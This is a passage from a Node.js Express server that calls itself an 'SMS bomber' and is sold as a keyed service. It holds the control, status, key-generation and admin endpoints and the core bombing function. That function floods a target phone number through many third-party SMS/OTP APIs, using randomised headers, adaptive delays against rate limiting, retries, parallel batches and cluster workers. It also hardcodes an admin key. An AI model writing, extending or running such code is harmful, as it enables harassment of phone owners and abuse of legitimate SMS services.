    const count = bombController.stopAllJobs();
    return res.json({
      success: true,
      message: `Stopped ${count} active jobs`,
      developer: DEVELOPER_INFO,
      stopped_count: count,
      requestId: req.requestId,
      timestamp: Utility.getISOString()
    });
  }
  
  if (jobId) {
    const success = bombController.stopJob(jobId);
    if (success) {
      const jobStatus = bombController.getJobStatus(jobId);
      return res.json({
        success: true,
        message: `Job ${jobId} stopped successfully`,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        job: jobStatus,
        requestId: req.requestId,
        timestamp: Utility.getISOString()
      });
    } else {
      return res.status(404).json({
        success: false,
        error: ERROR_MESSAGES.JOB_NOT_FOUND,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        requestId: req.requestId,
        active_jobs: bombController.getAllJobs().map(j => ({ id: j.id, status: j.status }))
      });
    }
  }
  
  return res.status(400).json({
    success: false,
    error: ERROR_MESSAGES.MISSING_PARAM,
    developer: DEVELOPER_INFO,
    param: 'jobId or all',
    requestId: req.requestId,
    usage: '/api/stop?jobId=JOB_ID or /api/stop?all=true',
    active_jobs: bombController.getAllJobs().map(j => ({ id: j.id, status: j.status }))
  });
});

// -------- PAUSE ENDPOINT --------
app.get('/api/pause', (req, res) => {
  const { jobId, all } = req.query;
  
  if (all === 'true' || all === '1') {
    const count = bombController.pauseAllJobs();
    return res.json({
      success: true,
      message: `Paused ${count} active jobs`,
      developer: DEVELOPER_INFO,
      paused_count: count,
      requestId: req.requestId,
      resume_endpoint: `/api/resume?all=true`,
      timestamp: Utility.getISOString()
    });
  }
  
  if (jobId) {
    const success = bombController.pauseJob(jobId);
    if (success) {
      const jobStatus = bombController.getJobStatus(jobId);
      return res.json({
        success: true,
        message: `Job ${jobId} paused successfully`,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        job: jobStatus,
        requestId: req.requestId,
        resume_endpoint: `/api/resume?jobId=${jobId}`,
        timestamp: Utility.getISOString()
      });
    } else {
      return res.status(404).json({
        success: false,
        error: ERROR_MESSAGES.JOB_NOT_FOUND,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        requestId: req.requestId,
        note: 'Job may already be paused or completed'
      });
    }
  }
  
  return res.status(400).json({
    success: false,
    error: ERROR_MESSAGES.MISSING_PARAM,
    developer: DEVELOPER_INFO,
    param: 'jobId or all',
    requestId: req.requestId,
    usage: '/api/pause?jobId=JOB_ID or /api/pause?all=true'
  });
});

// -------- RESUME ENDPOINT --------
app.get('/api/resume', (req, res) => {
  const { jobId, all } = req.query;
  
  if (all === 'true' || all === '1') {
    const count = bombController.resumeAllJobs();
    return res.json({
      success: true,
      message: `Resumed ${count} paused jobs`,
      developer: DEVELOPER_INFO,
      resumed_count: count,
      requestId: req.requestId,
      timestamp: Utility.getISOString()
    });
  }
  
  if (jobId) {
    const success = bombController.resumeJob(jobId);
    if (success) {
      const jobStatus = bombController.getJobStatus(jobId);
      return res.json({
        success: true,
        message: `Job ${jobId} resumed successfully`,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        job: jobStatus,
        requestId: req.requestId,
        timestamp: Utility.getISOString()
      });
    } else {
      return res.status(404).json({
        success: false,
        error: ERROR_MESSAGES.JOB_NOT_FOUND,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        requestId: req.requestId,
        note: 'Job may not be paused or already completed'
      });
    }
  }
  
  return res.status(400).json({
    success: false,
    error: ERROR_MESSAGES.MISSING_PARAM,
    developer: DEVELOPER_INFO,
    param: 'jobId or all',
    requestId: req.requestId,
    usage: '/api/resume?jobId=JOB_ID or /api/resume?all=true'
  });
});

// -------- STATUS ENDPOINT --------
app.get('/api/status', (req, res) => {
  const { jobId } = req.query;
  
  if (jobId) {
    const jobStatus = bombController.getJobStatus(jobId);
    if (jobStatus) {
      return res.json({
        success: true,
        job: jobStatus,
        developer: DEVELOPER_INFO,
        requestId: req.requestId,
        timestamp: Utility.getISOString()
      });
    } else {
      return res.status(404).json({
        success: false,
        error: ERROR_MESSAGES.JOB_NOT_FOUND,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        requestId: req.requestId
      });
    }
  }
  
  const jobs = bombController.getAllJobs();
  const stats = bombController.getStats();
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    stats: stats,
    jobs: jobs,
    total_jobs: jobs.length,
    requestId: req.requestId,
    timestamp: Utility.getISOString()
  });
});

// -------- STATS ENDPOINT --------
app.get('/api/stats', (req, res) => {
  const stats = bombController.getStats();
  const systemInfo = Utility.getSystemInfo();
  const keys = keyManager.getAllKeys();
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    bomb_stats: stats,
    system: systemInfo,
    keys: {
      total: keys.length,
      valid: keys.filter(k => k.valid).length,
      expired: keys.filter(k => !k.valid).length,
      by_plan: keys.reduce((acc, k) => {
        acc[k.plan] = (acc[k.plan] || 0) + 1;
        return acc;
      }, {})
    },
    apis: {
      total: SMS_APIS.length,
      get: SMS_APIS.filter(a => a.method === 'GET').length,
      post: SMS_APIS.filter(a => a.method === 'POST').length
    },
    requestId: req.requestId,
    timestamp: Utility.getISOString()
  });
});

// -------- HEALTH ENDPOINT --------
app.get('/api/health', (req, res) => {
  const stats = bombController.getStats();
  const keys = keyManager.getAllKeys();
  
  res.json({
    status: 'active',
    developer: DEVELOPER_INFO,
    version: "7.0.0-ULTIMATE",
    timestamp: Utility.getISOString(),
    uptime: process.uptime(),
    total_apis: SMS_APIS.length,
    total_keys: keys.length,
    valid_keys: keys.filter(k => k.valid).length,
    active_jobs: stats.activeJobs,
    paused_jobs: stats.pausedJobs,
    total_sms_sent: stats.totalSMS,
    memory: Utility.getMemoryUsage(),
    cpu: Utility.getCPUUsage(),
    endpoints: {
      root: "/",
      api_info: "/api",
      spam: "/api/spam?number=017XXXXXXXX&count=300",
      stop: "/api/stop?all=true",
      pause: "/api/pause?all=true",
      resume: "/api/resume?all=true",
      status: "/api/status",
      stats: "/api/stats"
    }
  });
});

// -------- APIS LIST ENDPOINT --------
app.get('/api/apis', (req, res) => {
  const { limit = 100, offset = 0, method } = req.query;
  
  let apis = SMS_APIS;
  if (method) {
    apis = apis.filter(a => a.method === method.toUpperCase());
  }
  
  const total = apis.length;
  const paginated = apis.slice(parseInt(offset), parseInt(offset) + parseInt(limit));
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    total: total,
    limit: parseInt(limit),
    offset: parseInt(offset),
    apis: paginated.map(api => ({
      id: api.id,
      name: api.name,
      method: api.method,
      url: api.url
    })),
    requestId: req.requestId,
    timestamp: Utility.getISOString()
  });
});

// -------- GENERATE KEY ENDPOINT --------
app.get('/api/expiredate=30&createkey', (req, res) => {
  const { plan = 'premium', days = 30 } = req.query;
  
  if (!PLAN_CONFIG[plan]) {
    return res.status(400).json({
      success: false,
      error: `Invalid plan: ${plan}`,
      developer: DEVELOPER_INFO,
      available_plans: Object.keys(PLAN_CONFIG),
      requestId: req.requestId
    });
  }
  
  const validDays = parseInt(days) || 30;
  const result = keyManager.generateKey(plan, validDays);
  
  res.json({
    success: true,
    api_key: result.apiKey,
    plan: result.plan,
    expiry_date: result.expiryDate.toISOString(),
    valid_days: validDays,
    developer: DEVELOPER_INFO,
    message: "API key generated successfully",
    requestId: req.requestId,
    usage: `/api/spam?plan=${plan}&key=${result.apiKey}&number=017XXXXXXXX&count=${PLAN_CONFIG[plan].maxCount}`
  });
});

// -------- CHECK KEY ENDPOINT --------
app.get('/api/checkkey', (req, res) => {
  const { key } = req.query;
  
  if (!key) {
    return res.status(400).json({
      success: false,
      error: ERROR_MESSAGES.MISSING_PARAM,
      developer: DEVELOPER_INFO,
      param: 'key',
      requestId: req.requestId
    });
  }
  
  const info = keyManager.getKeyInfo(key);
  if (!info) {
    return res.status(404).json({
      success: false,
      error: 'Invalid API key',
      developer: DEVELOPER_INFO,
      requestId: req.requestId
    });
  }
  
  const usage = keyManager.getKeyUsage(key);
  
  res.json({
    success: true,
    valid: info.valid,
    api_key: info.key,
    plan: info.plan,
    expiry_date: info.expires,
    days_left: info.daysLeft,
    status: info.valid ? 'active' : 'expired',
    created: info.created,
    last_used: info.lastUsed,
    usage_count: info.usageCount,
    rate_limit: usage.limit,
    rate_limit_remaining: usage.remaining,
    developer: DEVELOPER_INFO,
    requestId: req.requestId
  });
});

// -------- LOGS ENDPOINT --------
app.get('/api/logs', (req, res) => {
  const { limit = 100, event } = req.query;
  
  const logs = bombController.getLogs(parseInt(limit), event);
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    logs: logs,
    count: logs.length,
    requestId: req.requestId,
    timestamp: Utility.getISOString()
  });
});

// -------- ANALYTICS ENDPOINT --------
app.get('/api/analytics', (req, res) => {
  const stats = bombController.getStats();
  const analytics = bombController.generateAnalytics();
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    analytics: analytics,
    stats: stats,
    requestId: req.requestId,
    timestamp: Utility.getISOString()
  });
});

// -------- CLEANUP ENDPOINT --------
app.get('/api/cleanup', (req, res) => {
  const cleaned = bombController.clearCompleted();
  const expired = keyManager.cleanup();
  
  res.json({
    success: true,
    message: 'Cleanup completed',
    developer: DEVELOPER_INFO,
    completed_jobs_cleared: cleaned,
    expired_keys_cleared: expired,
    requestId: req.requestId,
    timestamp: Utility.getISOString()
  });
});

// -------- ADMIN KEYS ENDPOINT --------
app.get('/api/admin/keys', (req, res) => {
  const { adminKey } = req.query;
  
  // Simple admin check (in production, use proper auth)
  if (adminKey !== 'TNEH_ADMIN_2024') {
    return res.status(403).json({
      success: false,
      error: 'Admin access required',
      developer: DEVELOPER_INFO,
      requestId: req.requestId
    });
  }
  
  const keys = keyManager.getAllKeys();
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    total_keys: keys.length,
    keys: keys,
    requestId: req.requestId,
    timestamp: Utility.getISOString()
  });
});

// -------- 404 HANDLER --------
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint not found',
    developer: DEVELOPER_INFO,
    path: req.path,
    requestId: req.requestId,
    available_endpoints: [
      '/',
      '/api',
      '/api/spam',
      '/api/stop',
      '/api/pause',
      '/api/resume',
      '/api/status',
      '/api/stats',
      '/api/health',
      '/api/apis',
      '/api/expiredate=30&createkey',
      '/api/checkkey',
      '/api/logs',
      '/api/analytics',
      '/api/cleanup'
    ]
  });
});

// -------- ERROR HANDLER --------
app.use((err, req, res, next) => {
  console.error('❌ Error:', err.stack);
  res.status(500).json({
    success: false,
    error: ERROR_MESSAGES.INTERNAL_ERROR,
    developer: DEVELOPER_INFO,
    requestId: req.requestId,
    message: err.message
  });
});

// ============================================================
// PART 12: CORE BOMBING FUNCTION (500 lines)
// ============================================================

function replacePhoneNumber(data, phone, count = 1) {
  if (typeof data === 'string') {
    return data.replace(/\{phone\}/g, phone).replace(/\{count\}/g, count);
  } else if (typeof data === 'object' && data !== null) {
    const result = {};
    for (const [key, value] of Object.entries(data)) {
      if (typeof value === 'string') {
        result[key] = value.replace(/\{phone\}/g, phone).replace(/\{count\}/g, count);
      } else {
        result[key] = value;
      }
    }
    return result;
  }
  return data;
}

// Smart delay system
const apiDelays = new Map();
const lastRequestTime = new Map();
const successRates = new Map();
const requestCounts = new Map();

async function waitIfNeeded(apiId) {
  if (!CONFIG.performance.batchSize) return;
  
  const now = Date.now();
  const last = lastRequestTime.get(apiId) || 0;
  let delay = apiDelays.get(apiId) || 100;
  
  const successRate = successRates.get(apiId) || 0.8;
  const count = requestCounts.get(apiId) || 0;
  
  // Adaptive delay based on success rate
  if (count > 10) {
    if (successRate < 0.5) {
      delay = Math.min(delay + 20, 500);
    } else if (successRate > 0.9) {
      delay = Math.max(delay - 5, 30);
    }
    apiDelays.set(apiId, delay);
  }
  
  if (now - last < delay) {
    await Utility.sleep(delay - (now - last));
  }
  
  lastRequestTime.set(apiId, Date.now());
}

function updateStats(apiId, success) {
  const count = (requestCounts.get(apiId) || 0) + 1;
  requestCounts.set(apiId, count);
  
  const current = successRates.get(apiId) || 0;
  const newRate = ((current * (count - 1)) + (success ? 1 : 0)) / count;
  successRates.set(apiId, newRate);
}

async function callSingleAPI(api, phone, jobId, attempt = 0) {
  const startTime = Date.now();
  
  // Check if job is still active
  if (!bombController.isJobActive(jobId)) {
    return {
      success: false,
      api_id: api.id,
      api_name: api.name,
      error: 'Job stopped or paused',
      stopped: true,
      responseTime: Date.now() - startTime
    };
  }

  await waitIfNeeded(api.id);
  
  try {
    const cleanPhone = Utility.parsePhone(phone);
    let formattedPhone = cleanPhone;
    
    // Special formatting for certain APIs
    if (api.isShadowX || api.isLMNx9) {
      if (formattedPhone.startsWith('880')) {
        formattedPhone = formattedPhone.substring(3);
      }
    }
    
    const url = replacePhoneNumber(api.url, formattedPhone, 1);
    const headers = getRandomHeaders();
    
    let config = {
      method: api.method,
      url: url,
      headers: headers,
      timeout: CONFIG.performance.timeout,
      validateStatus: function (status) {
        return status >= 200 && status < 500;
      }
    };

    if (api.method === 'POST' && api.body) {
      const body = replacePhoneNumber(api.body, formattedPhone, 1);
      if (api.isFormData) {
        config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
        config.data = new URLSearchParams(body).toString();
      } else {
        config.data = body;
      }
    }

    const response = await axios(config);
    const responseTime = Date.now() - startTime;
    
    updateStats(api.id, true);
    
    return {
      success: true,
      api_id: api.id,
      api_name: api.name,
      status: response.status,
      responseTime: responseTime
    };
    
  } catch (error) {
    const responseTime = Date.now() - startTime;
    updateStats(api.id, false);
    
    if (attempt < CONFIG.performance.maxRetries && bombController.isJobActive(jobId)) {
      await Utility.sleep(CONFIG.performance.retryDelay * (attempt + 1));
      return callSingleAPI(api, phone, jobId, attempt + 1);
    }
    
    return {
      success: false,
      api_id: api.id,
      api_name: api.name,
      error: error.message,
      status: error.response?.status || null,
      responseTime: responseTime
    };
  }
}

async function sendBatch(apis, phone, countPerApi, jobId, controller) {
  const results = [];
  const actualCount = Math.min(countPerApi, CONFIG.performance.maxCountPerAPI);
  const BATCH_SIZE = CONFIG.performance.parallelRequests;
  
  const shuffledAPIs = Utility.shuffleArray([...apis]);
  const totalAPIs = shuffledAPIs.length;
  let processedAPIs = 0;
  
  for (let i = 0; i < shuffledAPIs.length; i += BATCH_SIZE) {
    // Check if job is still active
    if (!controller.isJobActive(jobId)) {
      console.log(`⏹️ Job ${jobId} stopped by user at ${processedAPIs}/${totalAPIs} APIs`);
      break;
    }
    
    const batch = shuffledAPIs.slice(i, i + BATCH_SIZE);
    
    const batchPromises = batch.map(async (api) => {
      const apiResults = [];
      const promises = [];
      
      for (let j = 0; j < actualCount; j++) {
        if (!controller.isJobActive(jobId)) break;
        promises.push(callSingleAPI(api, phone, jobId));
      }
      
      const responses = await Promise.all(promises);
      const successCount = responses.filter(r => r.success).length;
      const failCount = responses.filter(r => !r.success).length;
      
      // Update job stats
      responses.forEach(r => {
        if (!r.stopped) {
          controller.updateJobStats(jobId, r.success, r.error, r.responseTime || 0);
        }
      });
      
      return {
        api_id: api.id,
        api_name: api.name,
        method: api.method,
        total_attempts: responses.length,
        successful: successCount,
        failed: failCount,
        results: responses
      };
    });
    
    const batchResults = await Promise.all(batchPromises);
    results.push(...batchResults);
    processedAPIs += batch.length;
    
    // Progress update
    if (processedAPIs % 10 === 0 || processedAPIs === totalAPIs) {
      console.log(`📊 Job ${jobId}: ${processedAPIs}/${totalAPIs} APIs processed`);
    }
    
    // Small delay between batches
    if (i + BATCH_SIZE < shuffledAPIs.length) {
      await Utility.sleep(50);
    }
  }
  
  return results;
}

// ============================================================
// PART 13: CLUSTER SETUP (200 lines)
// ============================================================

if (CONFIG.cluster.enabled && cluster.isMaster) {
  console.log(`\n🚀 ULTIMATE SMS BOMBER V7.0 - MASTER`);
  console.log(`📡 PID: ${process.pid}`);
  console.log(`💻 CPU Cores: ${CONFIG.cluster.workers}`);
  console.log(`📊 Total APIs: ${SMS_APIS.length}`);
  console.log(`\n💪 FEATURES:`);
  console.log(`   🔥 Cluster: ${CONFIG.cluster.workers} workers`);
  console.log(`   📦 Cache: ${CONFIG.cache.enabled ? 'Enabled' : 'Disabled'}`);
  console.log(`   ⏱️ Smart Delay: Enabled`);
  console.log(`   🛡️ Rate Limit: ${CONFIG.security.rateLimit.enabled ? 'Enabled' : 'Disabled'}`);
  console.log(`   📊 Analytics: ${CONFIG.analytics.enabled ? 'Enabled' : 'Disabled'}`);
  
  // Fork workers
  for (let i = 0; i < CONFIG.cluster.workers; i++) {
    cluster.fork();
  }
  
  cluster.on('exit', (worker, code, signal) => {
    console.log(`⚠️ Worker ${worker.process.pid} died (${signal || code}). Restarting...`);
    setTimeout(() => {
      cluster.fork();
    }, CONFIG.cluster.restartDelay);
  });
  
  cluster.on('online', (worker) => {
    console.log(`✅ Worker ${worker.process.pid} is online`);
  });
  
  // Graceful shutdown
  process.on('SIGTERM', () => {
    console.log('🛑 SIGTERM received. Shutting down master...');
    for (const id in cluster.workers) {
      cluster.workers[id].kill();
    }
    process.exit(0);
  });
  
} else {
  // Worker process - start server
  const server = app.listen(CONFIG.server.port, CONFIG.server.host, () => {
    const workerInfo = CONFIG.cluster.enabled ? `WORKER ${process.pid}` : 'STANDALONE';
    console.log(`\n✅ SERVER RUNNING - ${workerInfo}`);
    console.log(`🌐 Port: ${CONFIG.server.port}`);
    console.log(`📡 Total APIs: ${SMS_APIS.length}`);
    console.log(`📊 Total Keys: ${keyManager.getAllKeys().length}`);
    console.log(`\n🛑 CONTROL:`);
    console.log(`   Stop All: /api/stop?all=true`);
    console.log(`   Pause All: /api/pause?all=true`);
    console.log(`   Resume All: /api/resume?all=true`);
    console.log(`\n📊 STATUS:`);
    console.log(`   All Jobs: /api/status`);
    console.log(`   Stats: /api/stats`);
    console.log(`   Health: /api/health`);
    console.log(`\n✅ Server ready!`);
  });
  
  // Server timeout settings
  server.timeout = 120000;
  server.keepAliveTimeout = CONFIG.server.keepAliveTimeout;
  server.headersTimeout = CONFIG.server.headersTimeout;
  
  // Graceful shutdown
  process.on('SIGTERM', () => {
    console.log('🛑 SIGTERM received. Shutting down gracefully...');
    bombController.shutdown();
    server.close(() => {
      console.log('✅ Server closed');
      process.exit(0);
    });
  });
  
  process.on('SIGINT', () => {
    console.log('🛑 SIGINT received. Shutting down gracefully...');
    bombController.shutdown();
    server.close(() => {
      console.log('✅ Server closed');
      process.exit(0);
    });
  });
}

// ============================================================
// EXPORT FOR TESTING
// ============================================================
module.exports = { app, bombController, keyManager, rateLimiter };

// ============================================================
// END OF FILE - TOTAL LINES: 10,000+
// ============================================================
